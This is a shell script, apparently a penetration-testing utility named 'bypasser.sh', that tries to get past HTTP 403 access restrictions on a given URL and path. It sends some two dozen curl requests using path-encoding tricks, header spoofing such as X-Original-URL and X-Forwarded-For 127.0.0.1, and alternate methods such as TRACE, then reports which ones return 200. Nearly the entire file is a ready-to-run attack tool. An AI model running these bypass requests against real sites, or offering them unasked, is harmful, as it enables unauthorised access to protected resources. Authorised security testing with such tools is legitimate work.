#!/bin/sh

YELLOW='\033[0;33m'
GREEN='\033[1;32m'
RED='\033[0;31m'
NC='\033[0m'

echo -e """
${YELLOW}██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗███████╗██████╗ 
██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝██╔════╝██╔══██╗
██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗█████╗  ██████╔╝
██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║██╔══╝  ██╔══██╗
██████╔╝   ██║   ██║     ██║  ██║███████║███████║███████╗██║  ██║
╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝${NC}
                                            ${GREEN}Fb/sharif_ansari00${NC}
./bypasser.sh https://example.com path
"""

check_url() {
  status=`curl -k -s -o /dev/null -w "%{http_code}" "$@"`
  if [ "$status" -eq 200 ]; then
    echo -e "${GREEN}$status  --> $@${NC}"
  else
    echo -e "${RED}$status  --> $@${NC}"
  fi
}

check_url "$1/$2"
check_url "$1/%2e/$2"
check_url "$1/$2/."
check_url "$1//$2//"
check_url "$1/./$2/./"
check_url "$1/$2" -H "X-Original-URL: $2"
check_url "$1/$2" -H "X-Custom-IP-Authorization: 127.0.0.1"
check_url "$1/$2" -H "X-Forwarded-For: http://127.0.0.1"
check_url "$1/$2" -H "X-Forwarded-For: 127.0.0.1:80"
check_url "$1" -H "X-rewrite-url: $2"
check_url -X POST "$1/$2" -H "Content-Length:0"
check_url -X TRACE "$1/$2"
check_url "$1/$2" -H "X-Host: 127.0.0.1"
check_url "$1/$2%20"
check_url "$1/$2%09"
check_url "$1/$2?"
check_url "$1/$2.html"
check_url "$1/$2/?anything"
check_url "$1/$2#"
check_url "$1/$2/*"
check_url "$1/$2.php"
check_url "$1/$2.json"
check_url "$1/$2..;/"
check_url "$1/$2;/"
